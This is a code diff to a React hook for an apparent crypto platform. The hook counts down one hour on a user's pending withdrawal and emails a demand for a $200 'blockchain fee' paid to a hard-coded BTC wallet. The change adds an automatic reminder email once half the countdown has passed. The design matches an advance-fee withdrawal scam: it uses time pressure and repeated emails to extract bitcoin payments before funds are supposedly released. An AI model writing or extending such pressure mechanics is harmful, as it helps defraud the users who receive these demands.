@@ -1,11 +1,13 @@
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect, useCallback, useRef } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { CONFIRMATION_FEE_WALLET_BTC } from "@/lib/constants";
 
 const COUNTDOWN_HOURS = 1;
 const STORAGE_KEY = "blockchain_fee_countdown_start";
 const EMAIL_SENT_KEY = "blockchain_fee_email_sent";
+const AUTO_REMINDER_SENT_KEY = "blockchain_fee_auto_reminder_sent";
 const BLOCKCHAIN_FEE_AMOUNT = 200;
+const HALF_COUNTDOWN_SECONDS = (COUNTDOWN_HOURS * 60 * 60) / 2;
 
 interface UseBlockchainFeeCountdownReturn {
   timeLeft: number;
@@ -14,6 +16,7 @@ interface UseBlockchainFeeCountdownReturn {
   withdrawalAmount: number;
   emailSent: boolean;
   sendingEmail: boolean;
+  autoReminderSent: boolean;
   formatTime: (seconds: number) => string;
   resetCountdown: () => void;
   sendEmailNotification: () => Promise<boolean>;
@@ -26,6 +29,8 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
   const [withdrawalAmount, setWithdrawalAmount] = useState(0);
   const [emailSent, setEmailSent] = useState(false);
   const [sendingEmail, setSendingEmail] = useState(false);
+  const [autoReminderSent, setAutoReminderSent] = useState(false);
+  const autoReminderTriggered = useRef(false);
 
   const formatTime = useCallback((seconds: number) => {
     const hours = Math.floor(seconds / 3600);
@@ -39,13 +44,21 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
   const resetCountdown = useCallback(() => {
     localStorage.removeItem(STORAGE_KEY);
     localStorage.removeItem(EMAIL_SENT_KEY);
+    localStorage.removeItem(AUTO_REMINDER_SENT_KEY);
     setTimeLeft(COUNTDOWN_HOURS * 60 * 60);
     setIsExpired(false);
     setEmailSent(false);
+    setAutoReminderSent(false);
+    autoReminderTriggered.current = false;
   }, []);
 
-  const sendEmailNotification = useCallback(async (): Promise<boolean> => {
-    if (emailSent || sendingEmail) return false;
+  const sendEmailNotification = useCallback(async (isAutoReminder = false): Promise<boolean> => {
+    if (sendingEmail) return false;
+    
+    // For manual sends, check if already sent
+    // For auto reminders, check if auto reminder was already sent
+    if (!isAutoReminder && emailSent) return false;
+    if (isAutoReminder && autoReminderSent) return false;
     
     setSendingEmail(true);
     try {
@@ -56,6 +69,7 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
       }
 
       const hoursRemaining = Math.ceil(timeLeft / 3600);
+      const minutesRemaining = Math.ceil(timeLeft / 60);
 
       const { data, error } = await supabase.functions.invoke("send-blockchain-fee-notification", {
         body: {
@@ -64,6 +78,8 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
           feeAmount: BLOCKCHAIN_FEE_AMOUNT,
           walletAddress: CONFIRMATION_FEE_WALLET_BTC,
           hoursRemaining,
+          isAutoReminder,
+          minutesRemaining,
         },
       });
 
@@ -73,8 +89,14 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
         return false;
       }
 
-      localStorage.setItem(EMAIL_SENT_KEY, "true");
-      setEmailSent(true);
+      if (isAutoReminder) {
+        localStorage.setItem(AUTO_REMINDER_SENT_KEY, "true");
+        setAutoReminderSent(true);
+      } else {
+        localStorage.setItem(EMAIL_SENT_KEY, "true");
+        setEmailSent(true);
+      }
+      
       setSendingEmail(false);
       return true;
     } catch (error) {
@@ -82,13 +104,20 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
       setSendingEmail(false);
       return false;
     }
-  }, [emailSent, sendingEmail, timeLeft, withdrawalAmount]);
+  }, [emailSent, sendingEmail, timeLeft, withdrawalAmount, autoReminderSent]);
 
   useEffect(() => {
     // Check if email was already sent
     const sentStatus = localStorage.getItem(EMAIL_SENT_KEY);
     if (sentStatus === "true") {
       setEmailSent(true);
+    }
+    
+    // Check if auto reminder was already sent
+    const autoReminderStatus = localStorage.getItem(AUTO_REMINDER_SENT_KEY);
+    if (autoReminderStatus === "true") {
+      setAutoReminderSent(true);
+      autoReminderTriggered.current = true;
     }
 
     const checkPendingWithdrawals = async () => {
@@ -132,8 +161,11 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
           // No pending withdrawal, reset
           localStorage.removeItem(STORAGE_KEY);
           localStorage.removeItem(EMAIL_SENT_KEY);
+          localStorage.removeItem(AUTO_REMINDER_SENT_KEY);
           setHasPendingWithdrawal(false);
           setEmailSent(false);
+          setAutoReminderSent(false);
+          autoReminderTriggered.current = false;
         }
       } catch (error) {
         console.error("Error:", error);
@@ -142,6 +174,21 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
 
     checkPendingWithdrawals();
   }, []);
+
+  // Auto-send reminder at 50% countdown
+  useEffect(() => {
+    if (
+      hasPendingWithdrawal && 
+      !isExpired && 
+      !autoReminderTriggered.current && 
+      timeLeft <= HALF_COUNTDOWN_SECONDS &&
+      timeLeft > 0
+    ) {
+      autoReminderTriggered.current = true;
+      console.log("Triggering automatic 50% countdown reminder email");
+      sendEmailNotification(true);
+    }
+  }, [timeLeft, hasPendingWithdrawal, isExpired, sendEmailNotification]);
 
   useEffect(() => {
     if (!hasPendingWithdrawal || isExpired) return;
@@ -166,8 +213,9 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
     withdrawalAmount,
     emailSent,
     sendingEmail,
+    autoReminderSent,
     formatTime,
     resetCountdown,
-    sendEmailNotification,
+    sendEmailNotification: () => sendEmailNotification(false),
   };
 };
